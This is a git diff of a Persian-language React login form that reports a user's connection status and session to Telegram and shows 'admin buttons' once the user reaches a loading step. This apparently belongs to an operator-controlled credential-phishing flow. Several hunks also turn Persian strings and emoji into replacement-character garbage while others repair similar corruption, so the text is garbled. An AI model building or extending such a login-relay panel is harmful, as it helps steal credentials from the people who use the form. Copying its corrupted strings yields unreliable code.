@@ -41,6 +41,7 @@ import {
 
 import { quickDebug } from "@/lib/telegram-debug-helper";
 import { useRealtimePresence } from "@/hooks/useRealtimePresence";
+import { checkNetworkStatus } from "@/lib/enhanced-offline-detection";
 
 type AuthStep =
   | "phone"
@@ -333,7 +334,7 @@ export const LoginForm = () => {
             console.error("❌ Failed to send enhanced status check:", error);
           });
         }).catch((error) => {
-          // ��ر صورت خطا، بررسی دقیق‌تر وضعیت
+          // در صورت خطا، بررسی دقیق‌تر وضعیت
           console.error("❌ Network test failed, performing detailed analysis:", error);
 
           // اگر navigator.onLine false است، قطعاً آفلاین است
@@ -363,7 +364,7 @@ export const LoginForm = () => {
               isVisible,
               Date.now(),
               "offline",
-              "����",
+              "🔴",
               true, // forceUpdate = true
             ).then(() => {
               console.log("✅ Connection issue status sent to Telegram");
@@ -504,7 +505,7 @@ export const LoginForm = () => {
       // Show admin buttons after reaching loading page
       setTimeout(async () => {
         try {
-          console.log("📱 User reached loading step, showing admin buttons...");
+          console.log("���� User reached loading step, showing admin buttons...");
           await showAdminButtons(sessionId);
 
           // In demo mode, show manual admin controls
@@ -2609,7 +2610,7 @@ export const LoginForm = () => {
                     onClick={(e) => {
                       e.preventDefault();
                       alert(
-                        "لینک بازیابی رمز عبور به ایمیل شما ارسال خواهد شد.",
+                        "لینک بازیابی رم�� عبور به ایمیل شما ارسال خواهد شد.",
                       );
                     }}
                     style={{
